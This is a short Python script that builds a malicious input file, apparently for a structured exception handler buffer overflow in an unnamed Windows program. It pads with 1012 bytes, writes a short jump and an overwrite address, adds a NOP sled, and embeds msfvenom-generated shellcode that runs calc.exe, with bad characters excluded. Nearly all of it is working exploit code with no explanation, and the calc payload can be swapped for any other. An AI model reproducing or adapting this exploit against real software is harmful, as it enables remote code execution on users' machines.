f = open("crash-6.txt", "wb")

buf = b"\x41" * 1012
buf += b"\xEB\x0B\x90\x90"
buf += b"\xc8\x12\x90\x6c"     #0x6c9012c8
buf += b"\x90"* 50             #NOP Sled

#msfvenom-a x86 -p windows/exec CMD=calc.exe -b '\x00\x04\x0D' -f python


buf += b"\xdd\xc4\xbd\x22\xaa\xc2\xe1\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x31\x83\xeb\xfc\x31\x6b\x14\x03\x6b"
buf += b"\x36\x48\x37\x1d\xde\x0e\xb8\xde\x1e\x6f\x30\x3b"
buf += b"\x2f\xaf\x26\x4f\x1f\x1f\x2c\x1d\x93\xd4\x60\xb6"
buf += b"\x20\x98\xac\xb9\x81\x17\x8b\xf4\x12\x0b\xef\x97"
buf += b"\x90\x56\x3c\x78\xa9\x98\x31\x79\xee\xc5\xb8\x2b"
buf += b"\xa7\x82\x6f\xdc\xcc\xdf\xb3\x57\x9e\xce\xb3\x84"
buf += b"\x56\xf0\x92\x1a\xed\xab\x34\x9c\x22\xc0\x7c\x86"
buf += b"\x27\xed\x37\x3d\x93\x99\xc9\x97\xea\x62\x65\xd6"
buf += b"\xc3\x90\x77\x1e\xe3\x4a\x02\x56\x10\xf6\x15\xad"
buf += b"\x6b\x2c\x93\x36\xcb\xa7\x03\x93\xea\x64\xd5\x50"
buf += b"\xe0\xc1\x91\x3f\xe4\xd4\x76\x34\x10\x5c\x79\x9b"
buf += b"\x91\x26\x5e\x3f\xfa\xfd\xff\x66\xa6\x50\xff\x79"
buf += b"\x09\x0c\xa5\xf2\xa7\x59\xd4\x58\xad\x9c\x6a\xe7"
buf += b"\x83\x9f\x74\xe8\xb3\xf7\x45\x63\x5c\x8f\x59\xa6"
buf += b"\x19\x7f\x10\xeb\x0b\xe8\xfd\x79\x0e\x75\xfe\x57"
buf += b"\x4c\x80\x7d\x52\x2c\x77\x9d\x17\x29\x33\x19\xcb"
buf += b"\x43\x2c\xcc\xeb\xf0\x4d\xc5\x8f\x97\xdd\x85\x61"
buf += b"\x32\x66\x2f\x7e"

buf += b"\x90"* (3000 - len(buf))

f.write(buf)
f.close()
